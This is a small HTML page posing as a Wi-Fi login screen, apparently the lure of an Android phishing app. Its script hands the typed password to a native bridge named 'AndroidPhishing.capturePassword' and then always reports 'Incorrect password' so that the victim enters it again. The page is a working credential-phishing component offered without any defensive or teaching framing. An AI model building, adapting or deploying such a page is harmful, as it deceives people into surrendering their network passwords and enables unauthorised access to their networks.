<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Authentication</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; }
        input { margin: 10px; padding: 10px; width: 80%; }
        button { padding: 10px 20px; }
    </style>
</head>
<body>
<h2>Connect to Wi-Fi</h2>
<input type="password" id="password" placeholder="Enter Wi-Fi Password" />
<br>
<button onclick="submitPassword()">Connect</button>

<script>
        function submitPassword() {
            var password = document.getElementById("password").value;
            window.AndroidPhishing.capturePassword(password);
            alert("Incorrect password. Please try again.");
        }
    </script>
</body>
</html>
